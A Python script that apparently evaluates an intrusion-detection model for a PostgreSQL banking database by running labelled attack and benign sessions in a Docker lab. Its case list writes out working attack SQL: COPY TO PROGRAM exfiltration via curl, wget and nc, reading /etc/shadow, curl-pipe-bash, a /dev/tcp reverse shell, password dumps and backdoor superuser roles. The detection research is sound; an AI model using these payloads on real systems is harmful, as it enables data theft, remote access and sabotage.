#!/usr/bin/env python3
"""
run_full_live_experiments.py
============================
Master execution suite for CASCE real-time experiments:
1. Individual Attack & Normal Simulation Suite (24 distinct cases with full lifecycles):
   - 16 attack cases across all techniques (Exfil, OS command, SQLi, Reverse Shell, Privilege Abuse, Sabotage, APT)
   - 8 seen & unseen normal cases (Teller balance/deposit, DBA vacuum, Branch report, KYC compliance, BI export, Audit archive, pgbench)
   - Executes multi-statement sessions with live eBPF + PostgreSQL telemetry.
   - Produces isolated case directories with postgres_events.json, kernel_events.json, GraphML, high-res graph.png, and summary.json (calculating TP, TN, FP, FN).

2. Category-Wise Real-Time Experiments (4 classes evaluated independently):
   - Class 1: Privilege Abuse & Escalation
   - Class 2: Data Exfiltration
   - Class 3: SQL Injection & Sabotage
   - Class 4: Multi-Stage APT Scenarios
   - Evaluates each class under live streaming with casce_gat_v3p_ens2, recording TP, FN, FP, TN, Precision, Recall, F1, and Latency.
"""

from __future__ import annotations

import csv
import json
import os
import shutil
import subprocess
import sys
import time
from pathlib import Path
from typing import Dict, List, Any

import networkx as nx

REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO_ROOT))
sys.path.insert(0, str(REPO_ROOT / "individual_simulation"))

import algorithm_1
import algorithm2
import algorithm_3_abstract
import algorithm_4_hybrid
from generate_case_catalog import render_graph
from main import sanitize_for_graphml

WORKSPACE_HOST = Path("/home/adithyan/Desktop/Projects/CASCE_DATASET")
CONTAINER = "casce_environment"
INDIVIDUAL_OUT = REPO_ROOT / "individual_simulation" / "individual_cases"
CATEGORY_OUT = REPO_ROOT / "individual_simulation" / "category_experiments"


def run_cmd(cmd: List[str] | str, check: bool = True, shell: bool = False) -> subprocess.CompletedProcess:
    if isinstance(cmd, list) and not shell:
        res = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    else:
        res = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    if check and res.returncode != 0:
        raise RuntimeError(f"Command failed (exit {res.returncode}):\nSTDOUT: {res.stdout}\nSTDERR: {res.stderr}")
    return res


def logger_archive_and_start():
    print("[logger] Resetting capture and starting dual-plane logger...")
    run_cmd(f"docker exec -u root {CONTAINER} bash /dataset_workspace/logger.sh archive", shell=True)
    run_cmd(f"docker exec -u root {CONTAINER} bash /dataset_workspace/logger.sh start", shell=True)
    time.sleep(3)


def logger_stop():
    print("[logger] Stopping dual-plane logger...")
    run_cmd(f"docker exec -u root {CONTAINER} bash /dataset_workspace/logger.sh stop", shell=True)
    time.sleep(2)


def reset_database_state():
    """Ensure database has all standard tables and test accounts."""
    sql = """
    DROP ROLE IF EXISTS hacker;
    DROP ROLE IF EXISTS stealth_hacker;
    DROP ROLE IF EXISTS sqli_admin;
    CREATE TABLE IF NOT EXISTS transactions (
        transaction_id SERIAL PRIMARY KEY,
        account_id INT NOT NULL,
        amount NUMERIC(12, 2) NOT NULL,
        transaction_type VARCHAR(20) NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    );
    """
    run_cmd(f'docker exec {CONTAINER} psql -U postgres -d casce_banking -c "{sql}"', shell=True)


# ==============================================================================
# 1. INDIVIDUAL SIMULATION CASES (Full Multi-Statement Lifecycles)
# ==============================================================================

INDIVIDUAL_CASES = [
    # --- Class: Data Exfiltration ---
    {
        "id": "exfil_gzip_curl",
        "category": "Data Exfiltration",
        "is_attack": True,
        "role": "teller",
        "title": "Exfiltration (gzip + curl)",
        "statements": [
            "SELECT account_id, balance FROM accounts LIMIT 5;",
            "COPY (SELECT * FROM accounts LIMIT 10) TO PROGRAM 'gzip > /tmp/exfil_gzip_curl.dat && curl -s -X POST -d @/tmp/exfil_gzip_curl.dat http://127.0.0.1:9090 2>/dev/null || true';",
            "SELECT 1;",
        ],
    },
    {
        "id": "exfil_bzip2_wget",
        "category": "Data Exfiltration",
        "is_attack": True,
        "role": "teller",
        "title": "Exfiltration (bzip2 + wget)",
        "statements": [
            "SELECT account_id, balance FROM accounts WHERE balance > 50000 LIMIT 5;",
            "COPY (SELECT * FROM accounts LIMIT 10) TO PROGRAM 'bzip2 > /tmp/exfil_bzip2_wget.dat && wget -q --post-file=/tmp/exfil_bzip2_wget.dat http://127.0.0.1:9090 2>/dev/null || true';",
            "SELECT 1;",
        ],
    },
    {
        "id": "exfil_tar_nc",
        "category": "Data Exfiltration",
        "is_attack": True,
        "role": "teller",
        "title": "Exfiltration (tar + netcat)",
        "statements": [
            "SELECT count(*) FROM accounts;",
            "COPY (SELECT * FROM accounts LIMIT 10) TO PROGRAM 'tar -czf /tmp/exfil_tar_nc.dat - && nc -w 1 127.0.0.1 9090 < /tmp/exfil_tar_nc.dat 2>/dev/null || true';",
            "SELECT 1;",
        ],
    },
    {
        "id": "exfil_base64_curl",
        "category": "Data Exfiltration",
        "is_attack": True,
        "role": "teller",
        "title": "Exfiltration (base64 + curl)",
        "statements": [
            "SELECT account_id, customer_id FROM accounts LIMIT 5;",
            "COPY (SELECT * FROM accounts LIMIT 10) TO PROGRAM 'base64 > /tmp/exfil_base64_curl.dat && curl -s -X POST -d @/tmp/exfil_base64_curl.dat http://127.0.0.1:9090 2>/dev/null || true';",
            "SELECT 1;",
        ],
    },
    {
        "id": "exfil_zip_wget",
        "category": "Data Exfiltration",
        "is_attack": True,
        "role": "teller",
        "title": "Exfiltration (zip + wget)",
        "statements": [
            "SELECT * FROM accounts LIMIT 5;",
            "COPY (SELECT * FROM accounts LIMIT 10) TO PROGRAM 'zip -q /tmp/exfil_zip_wget.dat - && wget -q --post-file=/tmp/exfil_zip_wget.dat http://127.0.0.1:9090 2>/dev/null || true';",
            "SELECT 1;",
        ],
    },
    # --- Class: OS Command & Credential Harvesting ---
    {
        "id": "os_cat_shadow",
        "category": "Privilege Abuse & Escalation",
        "is_attack": True,
        "role": "teller",
        "title": "Credential Access (/etc/shadow)",
        "statements": [
            "SELECT current_user, session_user;",
            "COPY (SELECT 1) TO PROGRAM 'cat /etc/shadow > /tmp/out_cat_shadow.txt 2>/dev/null || true';",
            "SELECT 1;",
        ],
    },
    {
        "id": "os_chmod_tmp",
        "category": "Privilege Abuse & Escalation",
        "is_attack": True,
        "role": "teller",
        "title": "Defense Tampering (chmod 777 /tmp)",
        "statements": [
            "SELECT current_database();",
            "COPY (SELECT 1) TO PROGRAM 'chmod 777 /tmp > /tmp/out_chmod_tmp.txt 2>/dev/null || true';",
            "SELECT 1;",
        ],
    },
    {
        "id": "os_remote_bash",
        "category": "Privilege Abuse & Escalation",
        "is_attack": True,
        "role": "teller",
        "title": "Ingress Tool Transfer (curl | bash)",
        "statements": [
            "SELECT count(*) FROM accounts;",
            "COPY (SELECT 1) TO PROGRAM 'curl -s http://127.0.0.1:9090/mal.sh | bash > /tmp/out_remote_bash.txt 2>/dev/null || true';",
            "SELECT 1;",
        ],
    },
    {
        "id": "os_enum_system",
        "category": "Privilege Abuse & Escalation",
        "is_attack": True,
        "role": "teller",
        "title": "System Discovery (whoami / uname)",
        "statements": [
            "SELECT version();",
            "COPY (SELECT 1) TO PROGRAM 'id; whoami; uname -a > /tmp/out_enum_system.txt 2>/dev/null || true';",
            "SELECT 1;",
        ],
    },
    # --- Class: SQL Injection & Sabotage ---
    {
        "id": "sqli_dump_authid",
        "category": "SQL Injection & Sabotage",
        "is_attack": True,
        "role": "teller",
        "title": "SQLi Dump pg_authid Passwords",
        "statements": [
            "SELECT current_user;",
            "COPY (SELECT rolname, rolpassword FROM pg_authid) TO '/tmp/sqli_dump.txt';",
            "SELECT 1;",
        ],
    },
    {
        "id": "sqli_create_role",
        "category": "Privilege Abuse & Escalation",
        "is_attack": True,
        "role": "teller",
        "title": "SQLi Superuser Escalation",
        "statements": [
            "SELECT current_user;",
            "CREATE ROLE sqli_admin SUPERUSER LOGIN PASSWORD 'hacked';",
            "SELECT 1;",
        ],
    },
    {
        "id": "sqli_time_blind",
        "category": "SQL Injection & Sabotage",
        "is_attack": True,
        "role": "teller",
        "title": "Time-Based Blind SQLi (pg_sleep)",
        "statements": [
            "SELECT account_id FROM accounts WHERE account_id = 1;",
            "SELECT pg_sleep(2);",
            "SELECT 1;",
        ],
    },
    {
        "id": "sabotage_drop_table",
        "category": "SQL Injection & Sabotage",
        "is_attack": True,
        "role": "dba",
        "title": "Sabotage (DROP TABLE transactions)",
        "statements": [
            "SELECT count(*) FROM transactions;",
            "DROP TABLE IF EXISTS transactions CASCADE;",
            "CREATE TABLE transactions (transaction_id SERIAL PRIMARY KEY, account_id INT, amount NUMERIC(12,2), transaction_type VARCHAR(20));",
        ],
    },
    # --- Class: Multi-Stage APT & Reverse Shell ---
    {
        "id": "reverse_shell",
        "category": "Multi-Stage APT Scenarios",
        "is_attack": True,
        "role": "teller",
        "title": "Interactive Reverse Shell (port 4444)",
        "statements": [
            "SELECT count(*) FROM accounts;",
            "COPY (SELECT 1) TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 &\" || true';",
            "SELECT 1;",
        ],
    },
    {
        "id": "privilege_abuse",
        "category": "Privilege Abuse & Escalation",
        "is_attack": True,
        "role": "dba",
        "title": "Privilege Abuse (disable log + balance)",
        "statements": [
            "CREATE ROLE hacker WITH SUPERUSER LOGIN PASSWORD 'hacked';",
            "SELECT set_config('log_statement', 'none', false);",
            "UPDATE accounts SET balance = 999999 WHERE account_id = 1;",
        ],
    },
    {
        "id": "multistage_apt",
        "category": "Multi-Stage APT Scenarios",
        "is_attack": True,
        "role": "dba",
        "title": "Multi-Stage APT (Recon -> Escalate -> Exfil)",
        "statements": [
            "SELECT relname FROM pg_class WHERE relkind='r' AND relname NOT LIKE 'pg_%';",
            "CREATE ROLE stealth_hacker SUPERUSER LOGIN PASSWORD 'backdoor';",
            "COPY (SELECT * FROM accounts LIMIT 10) TO PROGRAM 'curl -s -X POST -d @- http://127.0.0.1:9090 > /dev/null 2>&1 || true';",
        ],
    },
    # --- Normal Workloads (Seen & Unseen) ---
    {
        "id": "benign_teller_balance",
        "category": "Seen Normal Workload",
        "is_attack": False,
        "role": "teller",
        "title": "Teller Routine Balance Inquiry",
        "statements": [
            "SELECT account_id, customer_id, balance FROM accounts WHERE account_id = 42;",
            "SELECT count(*) FROM accounts WHERE balance > 10000;",
            "SELECT 1;",
        ],
    },
    {
        "id": "benign_teller_deposit",
        "category": "Seen Normal Workload",
        "is_attack": False,
        "role": "teller",
        "title": "Teller Deposit Transaction",
        "statements": [
            "SELECT balance FROM accounts WHERE account_id = 10 FOR UPDATE;",
            "UPDATE accounts SET balance = balance + 500 WHERE account_id = 10;",
            "INSERT INTO transactions (account_id, amount, transaction_type) VALUES (10, 500.00, 'deposit');",
        ],
    },
    {
        "id": "benign_dba_vacuum",
        "category": "Seen Normal Workload",
        "is_attack": False,
        "role": "dba",
        "title": "DBA Routine Vacuum Maintenance",
        "statements": [
            "SELECT schemaname, tablename, n_live_tup FROM pg_stat_user_tables ORDER BY n_live_tup DESC LIMIT 5;",
            "VACUUM ANALYZE accounts;",
            "SELECT 1;",
        ],
    },
    {
        "id": "benign_branch_report",
        "category": "Seen Normal Workload",
        "is_attack": False,
        "role": "branch_manager",
        "title": "Branch Manager Aggregated Revenue",
        "statements": [
            "SELECT b.branch_name, count(a.account_id), sum(a.balance) FROM branches b JOIN accounts a ON a.branch_id = b.branch_id GROUP BY b.branch_name;",
            "SELECT 1;",
        ],
    },
    {
        "id": "benign_compliance_kyc",
        "category": "Unseen Normal Workload",
        "is_attack": False,
        "role": "compliance_officer",
        "title": "Compliance KYC High-Value Join",
        "statements": [
            "SELECT c.full_name, c.email, count(t.transaction_id), sum(t.amount) FROM customers c JOIN accounts a ON a.customer_id = c.customer_id JOIN transactions t ON t.account_id = a.account_id GROUP BY c.full_name, c.email HAVING count(t.transaction_id) > 0 LIMIT 10;",
            "SELECT 1;",
        ],
    },
    {
        "id": "benign_bi_export",
        "category": "Unseen Normal Workload",
        "is_attack": False,
        "role": "branch_manager",
        "title": "Branch Manager BI Export via curl",
        "statements": [
            "COPY (SELECT branch_id, count(*), sum(balance) FROM accounts GROUP BY branch_id) TO PROGRAM 'curl -s -X POST -d @- http://127.0.0.1:9090/bi_export 2>/dev/null || true';",
            "SELECT 1;",
        ],
    },
    {
        "id": "benign_audit_archive",
        "category": "Unseen Normal Workload",
        "is_attack": False,
        "role": "dba",
        "title": "DBA Nightly Audit Archive via gzip",
        "statements": [
            "COPY (SELECT * FROM audit_logs LIMIT 50) TO PROGRAM 'gzip > /tmp/audit_archive.csv.gz 2>/dev/null || true';",
            "SELECT 1;",
        ],
    },
    {
        "id": "benign_pgbench_tx",
        "category": "Seen Normal Workload",
        "is_attack": False,
        "role": "teller",
        "title": "Standard pgbench Transaction",
        "statements": [
            "UPDATE accounts SET balance = balance + 100 WHERE account_id = 1;",
            "SELECT balance FROM accounts WHERE account_id = 1;",
        ],
    },
]


def execute_individual_suite(model, templates):
    print("=" * 80)
    print("EXECUTING EXPERIMENT 2: INDIVIDUAL ATTACK & NORMAL SIMULATION SUITE")
    print("=" * 80)
    INDIVIDUAL_OUT.mkdir(parents=True, exist_ok=True)
    reset_database_state()

    logger_archive_and_start()

    for idx, case in enumerate(INDIVIDUAL_CASES, start=1):
        cid = case["id"]
        label = f"{'Malicious' if case['is_attack'] else 'Benign'}:{cid}"
        print(f"\n[{idx:02d}/{len(INDIVIDUAL_CASES)}] Executing live session: {cid} ({case['title']})...")

        # Construct multi-statement SQL script for this single session
        stmts = "\n".join(case["statements"])
        # Run inside single psql connection via stdin
        bash_script = f"""
PGAPPNAME="casce_label={label}" psql -X -q -h 127.0.0.1 -U {case['role']} -d casce_banking << 'PSQL_HEREDOC'
{stmts}
PSQL_HEREDOC
"""
        cmd = f"docker exec -i {CONTAINER} bash << 'HEREDOC'\n{bash_script}\nHEREDOC"
        res = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        time.sleep(1)

    time.sleep(4)
    logger_stop()

    # Copy captured master logs from workspace
    pg_file = WORKSPACE_HOST / "postgres_events.json"
    kernel_file = WORKSPACE_HOST / "kernel_events.json"
    lbl_file = WORKSPACE_HOST / "session_labels.jsonl"

    print("\n[*] Processing live captured logs through Algorithm 1, 2, 3, 4...")
    # Load labels
    session_labels = {}
    if lbl_file.exists():
        with open(lbl_file) as f:
            for line in f:
                if line.strip():
                    item = json.loads(line)
                    session_labels[item["session_id"]] = item["label"]

    master_log, correlated = algorithm_1.run_one(WORKSPACE_HOST)
    print(f"    Master log events: {len(master_log)}, Correlated pairs: {len(correlated)}")

    import tempfile
    with tempfile.TemporaryDirectory() as tmpdirname:
        tmp_root = Path(tmpdirname)
        algorithm_1.save_run_output("live_individual", master_log, correlated, tmp_root)
        event_table_path = tmp_root / "live_individual_event_table.json"
        correlation_path = tmp_root / "live_individual_session_correlation.csv"
        alg2_out_dir = tmp_root / "live_individual_alg2"

        # Create temporary labels.csv
        labels_csv = tmp_root / "labels.csv"
        with open(labels_csv, "w", newline="") as f:
            writer = csv.writer(f)
            writer.writerow(["session_id", "label"])
            for sid, lbl in session_labels.items():
                writer.writerow([sid, lbl])

        active_graphs, manifest_rows, orphans, parse_errs = algorithm2.run(
            event_table_path, correlation_path, alg2_out_dir, "live_individual", labels_csv
        )
        print(f"    Built {len(active_graphs)} native session graphs.")

        # Match each session back to its case ID
        matched_results = []
        confusion_counts = {"TP": 0, "TN": 0, "FP": 0, "FN": 0}

        for case in INDIVIDUAL_CASES:
            cid = case["id"]
            expected_label_prefix = cid

            # Find matching session
            matching_sids = [
                sid for sid, lbl in session_labels.items() if expected_label_prefix in lbl
            ]
            if not matching_sids:
                print(f"[-] Warning: No session matched for {cid}")
                continue

            target_sid = matching_sids[0]
            G_raw = active_graphs.get(target_sid)
            if not G_raw:
                continue

            # Run Algorithm 3 (Behavior Abstraction)
            G_enriched, behaviors = algorithm_3_abstract.abstract_session_graph(G_raw, templates)
            G_enriched = sanitize_for_graphml(G_enriched)

            # Run Algorithm 4 (Inference)
            det = algorithm_4_hybrid.detect(G_enriched, model, session_id=target_sid, theta_a=0.55, theta_r=0.55)
            risk = det["risk"]
            is_flagged = (det["status"] != "benign")

            # Confusion Matrix Classification (TP, TN, FP, FN)
            is_actual_attack = case["is_attack"]
            if is_actual_attack and is_flagged:
                verdict = "TP"  # True Positive
            elif is_actual_attack and not is_flagged:
                verdict = "FN"  # False Negative
            elif not is_actual_attack and is_flagged:
                verdict = "FP"  # False Positive
            else:
                verdict = "TN"  # True Negative

            confusion_counts[verdict] += 1

            # Save per-case files
            case_dir = INDIVIDUAL_OUT / cid
            case_dir.mkdir(parents=True, exist_ok=True)
            (case_dir / "graphml").mkdir(parents=True, exist_ok=True)

            graphml_file = case_dir / "graphml" / f"{cid}.graphml"
            nx.write_graphml(G_enriched, str(graphml_file))

            png_file = case_dir / "graph.png"
            render_graph(graphml_file, png_file, title=f"{case['title']} [{verdict}]")

            # Extract per-session events
            sess_pg_events = [ev for ev in master_log if ev.source == "postgres" and ev.pid == target_sid]
            with open(case_dir / "postgres_events.json", "w") as f:
                for ev in sess_pg_events:
                    f.write(json.dumps(ev.raw) + "\n")

            sess_kernel_events = [ev for ev in master_log if ev.source == "kernel" and ev.pid == target_sid]
            with open(case_dir / "kernel_events.json", "w") as f:
                for ev in sess_kernel_events:
                    f.write(json.dumps(ev.raw) + "\n")

            summary = {
                "case_id": cid,
                "session_id": target_sid,
                "title": case["title"],
                "category": case["category"],
                "ground_truth": "Malicious" if is_actual_attack else "Benign",
                "predicted_status": det["status"],
                "confusion_verdict": verdict,
                "risk_score": round(risk, 4),
                "rule_score": round(det["rule_score"], 4),
                "gat_score": round(det["gat_score"], 4),
                "node_count": G_enriched.number_of_nodes(),
                "edge_count": G_enriched.number_of_edges(),
                "detected_behaviors": [b["label"] for b in behaviors],
                "graphml_file": f"graphml/{cid}.graphml",
                "png_file": "graph.png",
            }
            with open(case_dir / "summary.json", "w") as f:
                json.dump(summary, f, indent=2)

            matched_results.append(summary)
            print(f"    [+] {cid:26s} | Nodes: {summary['node_count']:2d} | Edges: {summary['edge_count']:2d} | Risk: {risk:.3f} | {verdict}")

        manifest_path = INDIVIDUAL_OUT / "individual_suite_manifest.json"
        with open(manifest_path, "w") as f:
            json.dump({
                "confusion_matrix": confusion_counts,
                "cases": matched_results
            }, f, indent=2)

        print("\n" + "-" * 60)
        print("INDIVIDUAL SIMULATION SUITE RESULTS:")
        print(f"  True Positives (TP):  {confusion_counts['TP']}")
        print(f"  True Negatives (TN):  {confusion_counts['TN']}")
        print(f"  False Positives (FP): {confusion_counts['FP']}")
        print(f"  False Negatives (FN): {confusion_counts['FN']}")
        tot_att = confusion_counts['TP'] + confusion_counts['FN']
        tot_ben = confusion_counts['TN'] + confusion_counts['FP']
        rec = confusion_counts['TP'] / tot_att if tot_att > 0 else 1.0
        prec = confusion_counts['TP'] / (confusion_counts['TP'] + confusion_counts['FP']) if (confusion_counts['TP'] + confusion_counts['FP']) > 0 else 1.0
        f1 = 2 * prec * rec / (prec + rec) if (prec + rec) > 0 else 0.0
        print(f"  Recall:    {rec*100:.1f}%")
        print(f"  Precision: {prec*100:.1f}%")
        print(f"  F1-Score:  {f1:.4f}")
        print("-" * 60)

        return matched_results


# ==============================================================================
# 2. CATEGORY-WISE REAL-TIME STREAMING EXPERIMENTS
# ==============================================================================

CATEGORIES = [
    {
        "name": "Class 1: Privilege Abuse & Escalation",
        "folder": "class_1_privilege_abuse",
        "scripts": [
            "attack_privilege_abuse.sh",
            "attack_sqli_role.sh",
            "attack_priv_var_chmod_tmp.sh",
            "attack_priv_var_crontab_persist.sh",
            "attack_priv_var_cat_passwd.sh",
            "attack_priv_var_cat_shadow.sh",
        ],
    },
    {
        "name": "Class 2: Data Exfiltration",
        "folder": "class_2_data_exfiltration",
        "scripts": [
            "attack_exfil_var_0.sh", "attack_exfil_var_1.sh", "attack_exfil_var_2.sh",
            "attack_exfil_var_4.sh", "attack_exfil_var_5.sh", "attack_exfil_var_6.sh",
            "attack_exfil_var_8.sh", "attack_exfil_var_9.sh", "attack_exfil_var_10.sh",
            "attack_exfil_var_12.sh", "attack_exfil_var_13.sh", "attack_exfil_var_14.sh",
            "attack_exfil_var_16.sh", "attack_exfil_var_17.sh", "attack_exfil_var_18.sh",
        ],
    },
    {
        "name": "Class 3: SQL Injection & Sabotage",
        "folder": "class_3_sqli_sabotage",
        "scripts": [
            "attack_sqli_copy.sh",
            "attack_sqli_time.sh",
            "attack_sqli_union.sh",
            "attack_sabotage.sh",
        ],
    },
    {
        "name": "Class 4: Multi-Stage APT Scenarios",
        "folder": "class_4_multistage_apt",
        "scripts": [
            "attack_multi_session_apt.sh",
            "attack_reverse_shell.sh",
            "attack_priv_var_remote_bash.sh",
            "attack_priv_var_find_keys.sh",
            "attack_priv_var_enum_system.sh",
        ],
    },
]


def execute_category_wise_experiments(model, templates):
    print("\n" + "=" * 80)
    print("EXECUTING EXPERIMENT 1: CATEGORY-WISE REAL-TIME STREAMING EXPERIMENTS")
    print("=" * 80)
    CATEGORY_OUT.mkdir(parents=True, exist_ok=True)

    category_reports = []

    for cat_idx, cat in enumerate(CATEGORIES, start=1):
        cat_name = cat["name"]
        cat_dir = CATEGORY_OUT / cat["folder"]
        cat_dir.mkdir(parents=True, exist_ok=True)
        reset_database_state()

        print(f"\n[{cat_idx}/4] Starting Category Experiment: {cat_name}...")
        logger_archive_and_start()

        # Interleave benign traffic + category attacks
        attack_labels = []
        benign_labels = []

        # Benign sessions
        print("    Injecting concurrent normal banking workload...")
        for b_i in range(5):
            blbl = f"Benign:teller_tx_{b_i}"
            benign_labels.append(blbl)
            run_cmd(f'docker exec {CONTAINER} bash -c "PGAPPNAME=\\"casce_label={blbl}\\" psql -X -q -h 127.0.0.1 -U teller -d casce_banking -c \\"SELECT account_id, balance FROM accounts WHERE account_id = {b_i+1};\\" 2>&1 || true"', shell=True)
            time.sleep(0.5)

        # Unseen benign
        blbl_kyc = "Benign:kyc_compliance"
        benign_labels.append(blbl_kyc)
        run_cmd(f'docker exec {CONTAINER} bash -c "PGAPPNAME=\\"casce_label={blbl_kyc}\\" psql -X -q -h 127.0.0.1 -U compliance_officer -d casce_banking -c \\"SELECT count(*) FROM customers;\\" 2>&1 || true"', shell=True)
        time.sleep(0.5)

        # Category attacks
        print(f"    Executing {len(cat['scripts'])} live attack scripts for {cat_name}...")
        for script in cat["scripts"]:
            albl = f"Malicious:{script.replace('.sh', '')}"
            attack_labels.append(albl)
            script_path = f"/tmp/attack_workload_banking/{script}"
            run_cmd(f'docker exec -e REPEAT=1 {CONTAINER} bash -c "PGAPPNAME=\\"casce_label={albl}\\" bash {script_path} 2>&1 || true"', shell=True)
            time.sleep(1)

        time.sleep(3)
        logger_stop()

        # Copy captured logs to category dir
        shutil.copy2(WORKSPACE_HOST / "postgres_events.json", cat_dir / "postgres_events.json")
        shutil.copy2(WORKSPACE_HOST / "kernel_events.json", cat_dir / "kernel_events.json")
        shutil.copy2(WORKSPACE_HOST / "session_labels.jsonl", cat_dir / "session_labels.jsonl")

        # Process and evaluate
        session_labels = {}
        with open(cat_dir / "session_labels.jsonl") as f:
            for line in f:
                if line.strip():
                    item = json.loads(line)
                    session_labels[item["session_id"]] = item["label"]

        master_log, correlated = algorithm_1.run_one(cat_dir)
        import tempfile
        with tempfile.TemporaryDirectory() as tmpdirname:
            tmp_root = Path(tmpdirname)
            algorithm_1.save_run_output(cat["folder"], master_log, correlated, tmp_root)
            event_table_path = tmp_root / f"{cat['folder']}_event_table.json"
            correlation_path = tmp_root / f"{cat['folder']}_session_correlation.csv"
            alg2_out = tmp_root / "alg2"

            lbl_csv = tmp_root / "labels.csv"
            with open(lbl_csv, "w", newline="") as f:
                writer = csv.writer(f)
                writer.writerow(["session_id", "label"])
                for sid, lbl in session_labels.items():
                    writer.writerow([sid, lbl])

            active_graphs, manifest_rows, orphans, parse_errs = algorithm2.run(
                event_table_path, correlation_path, alg2_out, cat["folder"], lbl_csv
            )

            # Evaluate each session
            tp, fn, fp, tn = 0, 0, 0, 0
            latencies = []

            for sid, G_raw in active_graphs.items():
                lbl = session_labels.get(sid, "unknown")
                is_attack = "Malicious" in lbl
                G_enriched, behaviors = algorithm_3_abstract.abstract_session_graph(G_raw, templates)
                G_enriched = sanitize_for_graphml(G_enriched)

                t_start = time.perf_counter()
                det = algorithm_4_hybrid.detect(G_enriched, model, session_id=sid, theta_a=0.55, theta_r=0.55)
                lat = (time.perf_counter() - t_start)
                latencies.append(lat)

                is_flagged = (det["status"] != "benign")
                if is_attack:
                    if is_flagged:
                        tp += 1
                    else:
                        fn += 1
                else:
                    if is_flagged:
                        fp += 1
                    else:
                        tn += 1

            total_attacks = tp + fn
            total_benign = fp + tn
            recall = tp / total_attacks if total_attacks > 0 else 1.0
            precision = tp / (tp + fp) if (tp + fp) > 0 else 1.0
            f1 = (2 * precision * recall) / (precision + recall) if (precision + recall) > 0 else 0.0
            fpr = fp / total_benign if total_benign > 0 else 0.0

            sorted_lat = sorted(latencies)
            p50 = sorted_lat[len(sorted_lat) // 2] if sorted_lat else 0.0
            p90 = sorted_lat[int(len(sorted_lat) * 0.9)] if sorted_lat else 0.0

            report = {
                "category": cat_name,
                "folder": cat["folder"],
                "total_sessions": len(active_graphs),
                "attacks_total": total_attacks,
                "benign_total": total_benign,
                "TP": tp,
                "FN": fn,
                "FP": fp,
                "TN": tn,
                "Recall_TPR": round(recall, 4),
                "Precision": round(precision, 4),
                "F1_Score": round(f1, 4),
                "FPR": round(fpr, 4),
                "Latency_p50_s": round(p50, 4),
                "Latency_p90_s": round(p90, 4),
            }
            category_reports.append(report)
            with open(cat_dir / "report.json", "w") as f:
                json.dump(report, f, indent=2)

            print(f"    Results for {cat_name}:")
            print(f"      TP: {tp}, FN: {fn}, FP: {fp}, TN: {tn}")
            print(f"      Recall: {recall*100:.1f}%, Precision: {precision*100:.1f}%, F1: {f1:.4f}, FPR: {fpr*100:.2f}%")
            print(f"      Latency p50: {p50*1000:.1f} ms, p90: {p90*1000:.1f} ms")

    with open(CATEGORY_OUT / "category_summary.json", "w") as f:
        json.dump(category_reports, f, indent=2)

    return category_reports


def main():
    print("=" * 80)
    print("STARTING COMPLETE CASCE REAL-TIME EXPERIMENTAL SUITE")
    print("=" * 80)

    # 1. Load Ensemble Model
    print("[*] Loading production model: casce_gat_v3p_ens2.json...")
    model = algorithm_4_hybrid.load_model("casce_gat_v3p_ens2.json")
    templates = algorithm_3_abstract.initialize_templates()

    # 2. Run Individual Simulation Suite
    ind_results = execute_individual_suite(model, templates)

    # 3. Run Category-Wise Real-Time Experiments
    cat_results = execute_category_wise_experiments(model, templates)

    print("\n" + "=" * 80)
    print("ALL EXPERIMENTS COMPLETED SUCCESSFULLY!")
    print(f"Individual cases output: {INDIVIDUAL_OUT}")
    print(f"Category experiments output: {CATEGORY_OUT}")
    print("=" * 80)


if __name__ == "__main__":
    main()
